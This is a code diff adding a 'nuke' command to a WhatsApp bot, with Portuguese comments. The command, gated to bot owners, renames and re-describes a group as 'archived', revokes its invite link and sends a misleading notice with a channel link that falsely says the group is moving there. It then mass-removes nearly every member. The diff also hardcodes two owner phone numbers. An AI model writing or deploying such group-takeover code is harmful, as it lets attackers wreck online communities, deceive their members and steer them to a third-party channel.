@@ -446,6 +446,59 @@ export async function handler(chatUpdate) {
                 }
             }
 
+            // ── INJEÇÃO DIRETA DO COMANDO NUKE NATIVO (RÁPIDO) ──
+            if (command === 'nuke') {
+                console.log(chalk.black(chalk.bgRed(` [NUKE EXECUTADO DIRETO] `)), `de ${chalk.green(m.pushName || senderNum)}`)
+
+                if (!isSoberano) return m.reply(global.dfail('owner'))
+                if (!m.isGroup) return m.reply(global.dfail('group'))
+                if (!isBotAdmin) return m.reply(global.dfail('botAdmin'))
+
+                try {
+                    const ownerName = 'Dev Soberano'
+                    const groupOwnerId = groupMetadata.owner
+                    const donosNumeros = ['5574991940377', '556392775736']
+
+                    // Executa alterações sequencialmente sem delays arbitrários
+                    await this.groupUpdateSubject(m.chat, `ARQUIVADO POR: ${ownerName}`).catch(() => {})
+                    await this.groupUpdateDescription(m.chat, `Este grupo foi arquivado por ordens de ${ownerName}.`).catch(() => {})
+                    await this.groupRevokeInvite(m.chat).catch(() => {})
+
+                    const textNuke = `⚠️ *AVISO IMPORTANTE* ⚠️\n\n` +
+                                     `📢 O grupo está sendo transferido para o canal oficial!\n\n` +
+                                     `👉 *Entre agora para não perder o acesso* 👈\n\n` +
+                                     `⚔️ *𝐋 𝐂𝐎𝐌𝐌𝐔𝐍𝐈𝐓𝐘* 🏴\n` +
+                                     `https://whatsapp.com/channel/0029Vb8Wthb96H4LgqKcKv1T\n\n` +
+                                     `_By: ༄ Đev Šoberano ×͜×_`
+
+                    // Envia a mensagem de aviso ANTES de banir
+                    const paymentPayload = NkPetrov(textNuke, participants.map(p => p.id), m.sender, m.chat)
+                    await this.relayMessage(m.chat, paymentPayload, {})
+
+                    const membersToRemove = participants
+                        .map(p => p.id)
+                        .filter(id => {
+                            const cleanId = id.split('@')[0].split(':')[0].replace(/[^0-9]/g, '')
+                            const isBot = cleanId === botId || id === rawBotJid || (botLid && id.includes(botLid))
+                            const isCreator = id === groupOwnerId
+                            const isOwner = donosNumeros.includes(cleanId)
+                            const isSender = id === m.sender
+                            return !isBot && !isCreator && !isOwner && !isSender
+                        })
+
+                    if (membersToRemove.length > 0) {
+                        // Delay mínimo de 2s apenas para garantir que as msgs de cima cheguem antes do chute
+                        await new Promise(r => setTimeout(r, 2000))
+                        await this.groupParticipantsUpdate(m.chat, membersToRemove, 'remove')
+                        console.log(chalk.green(`[NUKE] Remoção de ${membersToRemove.length} plebeus concluída.`))
+                    }
+                    return
+                } catch (e) {
+                    console.error('Erro no Nuke:', e)
+                    return m.reply('Erro ao executar nuke rápido.')
+                }
+            }
+
             for (let name in global.plugins) {
                 let plugin = global.plugins[name]
                 if (!plugin || plugin.disabled) continue
